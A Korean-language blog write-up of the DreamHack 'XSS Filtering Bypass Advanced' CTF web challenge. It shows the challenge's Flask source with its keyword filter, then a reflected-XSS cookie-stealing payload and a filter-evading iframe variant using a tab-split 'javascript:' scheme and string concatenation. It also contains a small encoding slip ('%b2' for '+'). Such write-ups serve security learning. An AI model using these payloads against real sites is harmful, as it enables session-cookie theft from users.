---
{"title":"XSS Filtering Bypass Advanced","date":"2026-11-11","category":"ctf","tags":["WEB","드림핵"],"summary":"","section":["DreamHack"]}
---


# [ 보안 문제풀이 ] 드림핵 - XSS Filtering Bypass Advanced (WEB)

매일 드림핵 한 문제, 백준 한 문제씩 하려고 하는데 마음만 앞서고 몸이 잘 안 따라주는 것 같다.

푸는 건 어떻게든 풀겠는데, 하나하나 정리해서 다시 공부하는게 넘 힘들다 ㅠ.ㅠ

이번엔 제주도를 놀러 갔다 오는 바람에 문제를 푼지 3일만에 올리는거라 다시 맘 먹고 제대로 해야겠다..

이번에 풀어본 문제는 Level 3, WEB 문제이다.

XSS라고 함은 Cross-Site Scripting의 준말로 "남의 웹사이트에서 내가 만든 자바스크립트가 실행되게 만드는 것" 이다.

<table style="border-collapse: collapse; width: 100%;" border="1" data-path-to-node="5" data-ke-align="alignLeft"><tbody><tr><td><b>유형</b></td><td><b>설명</b></td><td><b>CTF에서의 특징</b></td></tr></tbody><tbody><tr><td><span data-path-to-node="5,1,0,0"><b data-index-in-node="0" data-path-to-node="5,1,0,0">Reflected XSS</b></span></td><td><span data-path-to-node="5,1,1,0">URL 파라미터 등에 포함된 스크립트가 즉시 브라우저에 반사되어 실행됨.</span></td><td><span data-path-to-node="5,1,2,0">주로 피해자에게 악성 링크를 클릭하게 유도하는 형태.</span></td></tr><tr><td><span data-path-to-node="5,2,0,0"><b data-index-in-node="0" data-path-to-node="5,2,0,0">Stored XSS</b></span></td><td><span data-path-to-node="5,2,1,0">게시판, 프로필 등에 스크립트가 저장되어, 해당 페이지를 보는 모든 사용자에게 실행됨.</span></td><td><span data-path-to-node="5,2,2,0">한 번 심어두면 '관리자'가 게시글을 확인하는 순간 공격 성공.</span></td></tr><tr><td><span data-path-to-node="5,3,0,0"><b data-index-in-node="0" data-path-to-node="5,3,0,0">DOM-based XSS</b></span></td><td><span data-path-to-node="5,3,1,0">브라우저 내에서 자바스크립트가 데이터를 잘못 처리할 때 발생.</span></td><td><span data-path-to-node="5,3,2,0">서버를 거치지 않고 브라우저단에서만 일어나서 탐지가 까다로움.</span></td></tr></tbody></table>

유형은 3가지가 있는데 이번에 사용할 공격 방법은 "Reflected XSS" 이다.

하지만 Filter가 존재하기 때문에 문제에 제공된 app.py의 파일을 확인하고 필터링을 우회하여 페이로드를 작성해야 한다.

```python
#!/usr/bin/python3
from flask import Flask, request, render_template
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
import urllib
import os

app = Flask(__name__)
app.secret_key = os.urandom(32)

try:
    FLAG = open("./flag.txt", "r").read()
except:
    FLAG = "[**FLAG**]"

def read_url(url, cookie={"name": "name", "value": "value"}):
    cookie.update({"domain": "127.0.0.1"})
    try:
        service = Service(executable_path="/chromedriver")
        options = webdriver.ChromeOptions()
        for _ in [
            "headless",
            "window-size=1920x1080",
            "disable-gpu",
            "no-sandbox",
            "disable-dev-shm-usage",
        ]:
            options.add_argument(_)
        driver = webdriver.Chrome(service=service, options=options)
        driver.implicitly_wait(3)
        driver.set_page_load_timeout(3)
        driver.get("http://127.0.0.1:8000/")
        driver.add_cookie(cookie)
        driver.get(url)
    except Exception as e:
        driver.quit()
        # return str(e)
        return False
    driver.quit()
    return True

def check_xss(param, cookie={"name": "name", "value": "value"}):
    url = f"http://127.0.0.1:8000/vuln?param={urllib.parse.quote(param)}"
    return read_url(url, cookie)

def xss_filter(text):
    _filter = ["script", "on", "javascript"]
    for f in _filter:
        if f in text.lower():
            return "filtered!!!"

    advanced_filter = ["window", "self", "this", "document", "location", "(", ")", "&#"]
    for f in advanced_filter:
        if f in text.lower():
            return "filtered!!!"

    return text

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/vuln")
def vuln():
    param = request.args.get("param", "")
    param = xss_filter(param)
    return param

@app.route("/flag", methods=["GET", "POST"])
def flag():
    if request.method == "GET":
        return render_template("flag.html")
    elif request.method == "POST":
        param = request.form.get("param")
        if not check_xss(param, {"name": "flag", "value": FLAG.strip()}):
            return '<script>alert("wrong??");history.go(-1);</script>'

        return '<script>alert("good");history.go(-1);</script>'

memo_text = ""

@app.route("/memo")
def memo():
    global memo_text
    text = request.args.get("memo", "")
    memo_text += text + "\n"
    return render_template("memo.html", memo=memo_text)

app.run(host="0.0.0.0", port=8000)
```

이렇게 app.py 파일을 분석하다 보면 

```python
def xss_filter(text):
    _filter = ["script", "on", "javascript"]
    for f in _filter:
        if f in text.lower():
            return "filtered!!!"

    advanced_filter = ["window", "self", "this", "document", "location", "(", ")", "&#"]
    for f in advanced_filter:
        if f in text.lower():
            return "filtered!!!"
```

여기 이 부분에 필터가 존재하는 것을 알 수 있다.

뭐 대충 저 필터에 안 걸리게 페이로드를 작성하면 되겠다.

![image01](/assets/uploads/mwbtkmg6.png)

서버를 열고 사이트를 들어가면 이렇게 되어있다.

![image02](/assets/uploads/mwbtkswm.png)

flag 창을 들어가면 XSS 취약점을 이용한 페이로드를 작성할 수 있는 ENTRY가 나온다.

우선 정석 페이로드를 작성해보면

```javascript
<script>location.href="/memo?memo="+document.cookie</script>
```

이렇게 나온다.

하나씩 뜯어서 확인하면

\- document.cookie -> 브라우저에 저장된 해당 사이트의 "쿠키"를 가져옴

\- "/memo?memo=" + ... -> 훔친 정보를 특정 주소의 파라미터로 합침

\- location.href = ... -> 현재 보고 있는 페이지를 강제로 새로운 주소로 이동시킴

하지만 필터링에 걸리는 단어가 많다.

모든 필터링에 우회하면 이런 페이로드가 작성된다.

```javascript
<iframe src="javascri&Tab;pt:top['locati'%2b'o'%2b'n']='/memo?memo='%2btop['docum'%2b'ent']['cookie']">
```

여기서 &Tab; 은 %0a 와 동일한 효과를 내면서도 텍스트 상으로 개행이 아니고

%b2 = + 인 것을 이용해서 우회 해주었다.

페이로드를 flag ENTRY에 작성하고 meno 페이지에 가면 flag가 출력된 것을 알 수 있다.

![image03](/assets/uploads/mwbtl0lv.png)
